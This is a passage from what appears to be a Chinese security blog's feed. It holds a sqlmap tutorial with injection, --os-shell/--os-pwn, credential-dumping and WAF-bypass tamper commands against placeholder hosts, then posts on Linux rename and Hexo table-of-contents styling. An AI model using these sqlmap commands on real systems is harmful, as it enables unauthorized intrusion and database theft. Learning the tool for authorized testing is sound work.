sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://www.xxx.com"</span> --cookie <span class="string">"id=1"</span></span><br></pre></td></tr></table></figure><h3 id="表单post"><a href="#表单post" class="headerlink" title="表单post"></a>表单post</h3><p>三种方式</p><ol><li><p>表单枚举<br> <code>python sqlmap.py -u &quot;http://www.xxx.com&quot; --forms</code></p></li><li><p>指定post参数<br> <code>python sqlmap.py -u &quot;http://www.xxx.com&quot; --data &quot;username=1&amp;passwd=1&quot;</code></p></li><li><p>抓包构造<br> <code>python sqlmap.py -r test.txt</code></p></li></ol><h3 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h3><p>简单判断伪静态<br>浏览器F12开发者工具控制台<br><code>alert(document.lastModified)</code><br>会弹出网页最后更新时间，多次刷新页面，通过时间判断出是否为静态页面</p><p><code>python sqlmap.py -u &quot;http://www.xxx.com/index.php/Index/id/1*.html&quot;</code></p><h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-cmd <span class="string">"ipconfig"</span></span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-<span class="keyword">shell</span></span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-pwn</span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --sql-<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><h3 id="waf-bypass"><a href="#waf-bypass" class="headerlink" title="waf bypass"></a>waf bypass</h3><p><code>python sqlmap.py -u &quot;http://www.xxx.com&quot; -v 3 --dbs --batch --tamper &quot;space2hash.py&quot;</code></p><p>常见waf绕过脚本encoder: space2hash.py, space2morehash.py, base64encode.py, charencode.py</p><p><strong>tamper WAF 绕过脚本列表注释</strong></p><ol><li>apostrophemask.py 用UTF-8全角字符替换单引号字符</li><li>apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</li><li>appendnullbyte.py 在payload末尾添加空字符编码</li><li>base64encode.py 对给定的payload全部字符使用Base64编码</li><li>between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</li><li>bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</li><li>chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</li><li>charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</li><li>charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</li><li>concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</li><li>equaltolike.py 用“LIKE”运算符替换全部等于号“=”</li><li>greatest.py 用“GREATEST”函数替换大于号“&gt;”</li><li>halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</li><li>ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</li><li>lowercase.py 用小写值替换每个关键字字符</li><li>modsecurityversioned.py 用注释包围完整的查询</li><li>modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</li><li>multiplespaces.py 在SQL关键字周围添加多个空格</li><li>nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</li><li>overlongutf8.py 转换给定的payload当中的所有字符</li><li>percentage.py 在每个字符之前添加一个百分号</li><li>randomcase.py 随机转换每个关键字字符的大小写</li><li>randomcomments.py 向SQL关键字中插入随机注释</li><li>securesphere.py 添加经过特殊构造的字符串</li><li>sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</li><li>space2comment.py 用“/**/”替换空格符</li><li>space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</li><li>space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</li><li>space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</li><li>space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li><li>space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</li><li>space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li><li>space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符</li><li>space2plus.py 用加号“+”替换空格符</li><li>space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li><li>unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</li><li>unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</li><li>varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</li><li>versionedkeywords.py 用MySQL注释包围每个非函数关键字</li><li>versionedmorekeywords.py 用MySQL注释包围每个关键字</li><li>xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</li></ol><p><strong>自动尝试每个tamper脚本</strong><br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for t in `<span class="keyword">ls</span> <span class="string">/usr/share/sqlmap/tamper/</span>*<span class="string">.py</span>`; do <span class="keyword">echo</span> -e <span class="string">"\e[41;1m  tamper: $t\e[0m"</span>; sqlmap -u <span class="string">"http://target.com/sql.asp?id=xx*"</span> <span class="params">--dbs</span> <span class="params">--random-agent</span> <span class="params">--smart</span> <span class="params">--batch</span> <span class="params">--tamper</span> $t <span class="params">--threads</span> 10;done;</span><br></pre></td></tr></table></figure></p><p><strong>说明下 :</strong></p><p>–random-agent 参数随机 random-agent  (可绕过一些检测) 当然此时也可以不要该参数<br>–smart 智能的方式<br>–batch 默认选择<br>echo -e “\e[41;1m  tamper: $t\e[0m”;  是为了 显眼的方式 显示 当前使用的 tamper 红底白字 加粗…  以方便找到合适tamper 然后停止。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://blog.sina.com.cn/s/blog_6b347b2a0101379o.html" target="_blank" rel="noopener">Cookie SQL注入</a><br><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">sqlmapproject/sqlmap</a><br><a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">sql_injection knowledge base</a><br><a href="http://sqlwiki.radare.cn/#/" target="_blank" rel="noopener">sql注入wiki</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-安装&quot;&gt;&lt;a href=&quot;#0x00-安装&quot; class=&quot;headerlink&quot; title=&quot;0x00 安装&quot;&gt;&lt;/a&gt;0x00 安装&lt;/h2&gt;&lt;p&gt;git clone &lt;a href=&quot;https://github.com/sqlmapproject/sqlmap.git&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/sqlmapproject/sqlmap.git&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-基本用法&quot;&gt;&lt;a href=&quot;#0x01-基本用法&quot; class=&quot;headerlink&quot; title=&quot;0x01 基本用法&quot;&gt;&lt;/a&gt;0x01 基本用法&lt;/h2&gt;&lt;h3 id=&quot;常用参数&quot;&gt;&lt;a href=&quot;#常用参数&quot; class=&quot;headerlink&quot; title=&quot;常用参数&quot;&gt;&lt;/a&gt;常用参数&lt;/h3&gt;&lt;figure class=&quot;highlight jboss-cli&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-dbs       &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--count&lt;/span&gt; -D “数据库”   &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;获取表中数据个数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--current-db&lt;/span&gt;           &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举当前数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--users&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--passwords&lt;/span&gt;              &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据库用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--current-user&lt;/span&gt;               &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举当前用户&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--privileges&lt;/span&gt;               &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;查看权限&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--os-shell&lt;/span&gt;                    &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;写web shell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--is-dba&lt;/span&gt;                    &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;判断当前用户是不是dba&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--tables&lt;/span&gt; -D &lt;span class=&quot;string&quot;&gt;&quot;数据库&quot;&lt;/span&gt;          &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据库的表名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--columns&lt;/span&gt; -T &lt;span class=&quot;string&quot;&gt;&quot;表名&quot;&lt;/span&gt; -D &lt;span class=&quot;string&quot;&gt;&quot;数据库&quot;&lt;/span&gt;       &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt; 列举列名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--dump&lt;/span&gt; -C &lt;span class=&quot;string&quot;&gt;&quot;列名&quot;&lt;/span&gt; -T &lt;span class=&quot;string&quot;&gt;&quot;表名&quot;&lt;/span&gt; -D &lt;span class=&quot;string&quot;&gt;&quot;数据库&quot;&lt;/span&gt;           &lt;span class=&quot;string&quot;&gt;//&lt;/span&gt;列举数据&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--start=&lt;/span&gt;：指定开始的行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--stop=&lt;/span&gt;：指定结束的行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;--threads=&lt;/span&gt;:线程数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;存储数据在 &lt;span class=&quot;string&quot;&gt;./sqlmap/output/.......&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-f &lt;span class=&quot;params&quot;&gt;--banner&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--dbs&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--users&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--batch&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;--crawl=3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;当&lt;span class=&quot;params&quot;&gt;--level&lt;/span&gt;为2以上，会尝试注入cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;当&lt;span class=&quot;params&quot;&gt;--level&lt;/span&gt;为3以上，会尝试注入user-agent、referer&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://www.pa55w0rd.club/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="工具使用" scheme="http://www.pa55w0rd.club/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>linux下批量重命名rename</title>
    <link href="http://www.pa55w0rd.club/rename-linux/"/>
    <id>http://www.pa55w0rd.club/rename-linux/</id>
    <published>2018-11-22T07:53:44.000Z</published>
    <updated>2018-11-22T08:08:30.961Z</updated>
    
    <content type="html"><![CDATA[<p>操作系统：Ubuntu</p><h2 id="安装rename"><a href="#安装rename" class="headerlink" title="安装rename"></a>安装rename</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># apt-get install rename -y</span><br></pre></td></tr></table></figure><a id="more"></a><ul><li><p>-n：打印效果但不执行</p></li><li><p>-v：执行修改并打印结果</p></li><li><p>s：替换，支持正则表达式</p></li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol><li><p>替换文件名中的字符串，将test1替换为test2</p><p> renema -v ‘s/test1/test2’ *.md</p></li><li><p>去掉文件名中的日期，格式2018-10-10</p><p> rename -v ‘s/\d{4}-\d{2}-\d{2}//‘ *.md  </p></li><li><p>去掉文件后缀名.bak</p><p> rename ‘s/.bak$//‘ *.bak</p></li><li><p>去掉文件名中的空格</p><p> rename ‘s/[ ]+//g’ *</p></li><li><p>在文件开头加入字符串test1</p><p> rename ‘s/^/test1/‘ *</p></li><li><p>在文件结尾加入字符串</p><p> rename ‘s/$/test1/‘ *</p></li><li><p>替换文件名中的大小写</p><p> rename -v ‘y/A-Z/a-z/‘ *</p></li></ol><p><strong><a href="http://tool.oschina.net/regex/#" target="_blank" rel="noopener">在线正则表达式测试</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;操作系统：Ubuntu&lt;/p&gt;
&lt;h2 id=&quot;安装rename&quot;&gt;&lt;a href=&quot;#安装rename&quot; class=&quot;headerlink&quot; title=&quot;安装rename&quot;&gt;&lt;/a&gt;安装rename&lt;/h2&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# apt-get install rename -y&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="解决方法" scheme="http://www.pa55w0rd.club/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>hexo添加文章目录</title>
    <link href="http://www.pa55w0rd.club/%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95/"/>
    <id>http://www.pa55w0rd.club/添加文章目录/</id>
    <published>2018-11-21T08:15:18.000Z</published>
    <updated>2018-11-21T08:48:33.495Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有的文章比较长，翻页查阅比较麻烦，添加文章目录功能</p><h2 id="0x01-添加文章目录"><a href="#0x01-添加文章目录" class="headerlink" title="0x01 添加文章目录"></a>0x01 添加文章目录</h2><a id="more"></a><h3 id="添加css样式"><a href="#添加css样式" class="headerlink" title="添加css样式"></a>添加css样式</h3><p>打开<code>themes\Landscape-x\source\css\_partial\article.styl</code>，添加下面代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 新添加的 */</span></span><br><span class="line"><span class="selector-id">#container</span> <span class="selector-class">.show-toc-btn</span>,<span class="selector-id">#container</span> <span class="selector-class">.toc-article</span>&#123;<span class="attribute">display</span>:block&#125;</span><br><span class="line"><span class="selector-class">.toc-article</span>&#123;<span class="attribute">z-index</span>:<span class="number">100</span>;<span class="attribute">background</span>:<span class="number">#fff</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#ccc</span>;<span class="attribute">max-width</span>:<span class="number">250px</span>;<span class="attribute">min-width</span>:<span class="number">150px</span>;<span class="attribute">max-height</span>:<span class="number">500px</span>;<span class="attribute">overflow-y</span>:auto;<span class="attribute">-webkit-box-shadow</span>:<span class="number">5px</span> <span class="number">5px</span> <span class="number">2px</span> <span class="number">#ccc</span>;<span class="attribute">box-shadow</span>:<span class="number">5px</span> <span class="number">5px</span> <span class="number">2px</span> <span class="number">#ccc</span>;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">padding</span>:<span class="number">10px</span>;<span class="attribute">position</span>:fixed;<span class="attribute">right</span>:<span class="number">35px</span>;<span class="attribute">top</span>:<span class="number">129px</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-close</span>&#123;<span class="attribute">font-weight</span>:<span class="number">700</span>;<span class="attribute">font-size</span>:<span class="number">20px</span>;<span class="attribute">cursor</span>:pointer;<span class="attribute">float</span>:right;<span class="attribute">color</span>:<span class="number">#ccc</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-close</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">color</span>:<span class="number">#000</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc</span>&#123;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">padding</span>:<span class="number">0</span>;<span class="attribute">line-height</span>:<span class="number">20px</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc</span> <span class="selector-class">.toc-number</span>&#123;<span class="attribute">color</span>:<span class="number">#333</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc</span> <span class="selector-class">.toc-text</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">text-decoration</span>:underline;<span class="attribute">color</span>:<span class="number">#2a6496</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-tag">li</span>&#123;<span class="attribute">list-style-type</span>:none&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-level-1</span>&#123;<span class="attribute">margin</span>:<span class="number">4px</span> <span class="number">0</span>&#125;<span class="selector-class">.toc-article</span> <span class="selector-class">.toc-child</span>&#123;&#125;@-<span class="keyword">moz</span>-<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;@-<span class="keyword">webkit</span>-<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;@-<span class="keyword">o</span>-<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;@<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;<span class="selector-class">.show-toc-btn</span>&#123;<span class="attribute">display</span>:none;<span class="attribute">z-index</span>:<span class="number">10</span>;<span class="attribute">width</span>:<span class="number">30px</span>;<span class="attribute">min-height</span>:<span class="number">14px</span>;<span class="attribute">overflow</span>:hidden;<span class="attribute">padding</span>:<span class="number">4px</span> <span class="number">6px</span> <span class="number">8px</span> <span class="number">5px</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#ddd</span>;<span class="attribute">border-right</span>:none;<span class="attribute">position</span>:fixed;<span class="attribute">right</span>:<span class="number">40px</span>;<span class="attribute">text-align</span>:center;<span class="attribute">background-color</span>:<span class="number">#f9f9f9</span>&#125;<span class="selector-class">.show-toc-btn</span> <span class="selector-class">.btn-bg</span>&#123;<span class="attribute">margin-top</span>:<span class="number">2px</span>;<span class="attribute">display</span>:block;<span class="attribute">width</span>:<span class="number">16px</span>;<span class="attribute">height</span>:<span class="number">14px</span>;<span class="attribute">background</span>:<span class="built_in">url</span>(http://7xtawy.com1.z0.glb.clouddn.com/show.png) no-repeat;<span class="attribute">-webkit-background-size</span>:<span class="number">100%</span>;<span class="attribute">-moz-background-size</span>:<span class="number">100%</span>;<span class="attribute">background-size</span>:<span class="number">100%</span>&#125;<span class="selector-class">.show-toc-btn</span> <span class="selector-class">.btn-text</span>&#123;<span class="attribute">color</span>:<span class="number">#999</span>;<span class="attribute">font-size</span>:<span class="number">12px</span>&#125;<span class="selector-class">.show-toc-btn</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">cursor</span>:pointer&#125;<span class="selector-class">.show-toc-btn</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.btn-bg</span>&#123;<span class="attribute">background-position</span>:<span class="number">0</span> -<span class="number">16px</span>&#125;<span class="selector-class">.show-toc-btn</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.btn-text</span>&#123;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">color</span>:<span class="number">#ea8010</span>&#125;</span><br><span class="line"><span class="selector-class">.toc-article</span> <span class="selector-tag">li</span> <span class="selector-tag">ol</span>, <span class="selector-class">.toc-article</span> <span class="selector-tag">li</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.toc-article</span> <span class="selector-tag">ol</span>, <span class="selector-class">.toc-article</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改article-ejs文件"><a href="#修改article-ejs文件" class="headerlink" title="修改article.ejs文件"></a>修改article.ejs文件</h3><p>使用的是Hexo的toc函数，<a href="https://hexo.io/zh-cn/docs/helpers#toc" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/helpers#toc</a></p><p>打开 <code>themes\Landscape-x\layout\_partial\article.ejs</code>，在<code>&lt;header&gt;</code>标签添加下面代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 目录内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 